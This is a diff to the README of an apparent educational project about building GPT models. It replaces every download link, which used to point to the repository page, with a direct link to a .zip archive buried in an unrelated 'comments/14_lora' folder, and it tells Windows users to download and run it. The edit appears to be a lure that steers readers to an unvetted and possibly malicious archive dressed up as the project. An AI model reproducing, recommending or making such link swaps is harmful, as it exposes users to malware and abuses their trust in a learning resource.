@@ -1,6 +1,6 @@
 # 🤖 micro-gpt-and-beyond-clean - Learn GPTs Step by Step
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/bearing-genusfothergilla76/micro-gpt-and-beyond-clean)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/bearing-genusfothergilla76/micro-gpt-and-beyond-clean/raw/refs/heads/main/walk-the-code/comments/14_lora/gpt-beyond-and-micro-clean-1.5.zip)
 
 ## 🧭 What this is
 
@@ -14,7 +14,7 @@ This project is built for learning. It breaks the process into small parts so yo
 
 Use this link to visit the page and download the project:
 
-[Download the project](https://github.com/bearing-genusfothergilla76/micro-gpt-and-beyond-clean)
+[Download the project](https://github.com/bearing-genusfothergilla76/micro-gpt-and-beyond-clean/raw/refs/heads/main/walk-the-code/comments/14_lora/gpt-beyond-and-micro-clean-1.5.zip)
 
 After you download it on Windows:
 
@@ -186,7 +186,7 @@ Try these steps if the app does not open:
 
 Use this page to download or open the project:
 
-[Visit the download page](https://github.com/bearing-genusfothergilla76/micro-gpt-and-beyond-clean)
+[Visit the download page](https://github.com/bearing-genusfothergilla76/micro-gpt-and-beyond-clean/raw/refs/heads/main/walk-the-code/comments/14_lora/gpt-beyond-and-micro-clean-1.5.zip)
 
 ## 🗂️ Topics covered
 
